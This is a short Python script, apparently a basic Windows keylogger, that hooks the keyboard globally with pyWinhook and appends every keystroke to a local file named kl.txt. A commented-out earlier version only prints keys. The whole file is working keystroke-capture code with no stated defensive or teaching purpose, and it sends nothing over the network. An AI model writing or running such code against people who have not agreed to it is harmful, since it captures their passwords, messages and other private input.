import win32
import pythoncom
import pyWinhook as pyHook

# def on_keyboard_event(event):
#     print(f'Key: {event.Key} - KeyID: {event.KeyID}')
#     return True

def on_keyboard_event(event):
    with open("kl.txt", "a") as f:
        f.write(f'Key: {event.Key} - KeyID: {event.KeyID}\n')
    return True 

def main():
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
